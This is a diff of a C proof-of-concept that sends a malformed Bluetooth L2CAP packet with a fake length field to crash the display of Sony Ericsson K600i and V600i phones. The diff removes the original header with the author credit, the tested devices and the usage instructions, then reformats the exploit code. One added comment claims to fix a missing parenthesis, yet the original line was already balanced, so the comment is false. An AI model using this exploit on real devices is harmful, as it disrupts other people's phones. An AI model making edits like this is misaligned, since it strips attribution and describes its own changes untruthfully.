@@ -1,25 +1,3 @@
-/*	Sony/Ericsson K600i reset display - PoC			*/
-/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
-/*	02-01-2006						*/
-/*	Vulnerability found using BSS fuzzer :			*/
-/*		http://securitech.homeunix.org/blue/		*/
-/*								*/
-/*	Causes anormal behaviours on some Sony/Ericsson 	*/
-/*	cell phones 						*/
-/*	Vulnerable tested devices :				*/
-/*		- K 600i					*/
-/*		- V 600i					*/
-/*		- And maybe other ones... 			*/
-/*								*/
-/*	Vulnerable devices will slowly turn their screen into 	*/
-/*	black and then display a white screen. 			*/
-/*	After a short period (~45sec), they will go back to 	*/
-/*	their normal behaviour					*/
-/*								*/
-/*	gcc -lbluetooth reset_display_K600i.c 			*/
-/*		-o reset_display_K600i				*/
-/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -68,8 +46,8 @@ int main(int argc, char **argv)
 		exit(EXIT_FAILURE);
 	}
 	
-	// Dynamically allocate memory for the buffer based on the FAKE_SIZE
-	if(!(buffer = (char *) malloc ((int) FAKE_SIZE + sizeof(l2cap_cmd_hdr))) {
+	// Corrected the syntax by adding the closing parenthesis after sizeof(l2cap_cmd_hdr)
+	if (!(buffer = (char *) malloc((int) (FAKE_SIZE + sizeof(l2cap_cmd_hdr)))) ) {
 		perror("malloc");
 		exit(EXIT_FAILURE);
 	}
@@ -81,13 +59,13 @@ int main(int argc, char **argv)
 	cmd->ident = 1;
 	cmd->len = FAKE_SIZE;
 	
-	if( (sent=send(sock, buffer, FAKE_SIZE + sizeof(l2cap_cmd_hdr), 0)) >= 0)
+	if ((sent = send(sock, buffer, FAKE_SIZE + sizeof(l2cap_cmd_hdr), 0)) >= 0)
 	{
 		printf("L2CAP packet sent (%d)\n", sent);
 	}
 
 	printf("Buffer:\t");
-	for(i=0; i<sent; i++)
+	for (i = 0; i < sent; i++)
 		printf("%.2X ", (unsigned char) buffer[i]);
 	printf("\n");
 
@@ -95,4 +73,3 @@ int main(int argc, char **argv)
 	close(sock);
 	return EXIT_SUCCESS;
 }
-
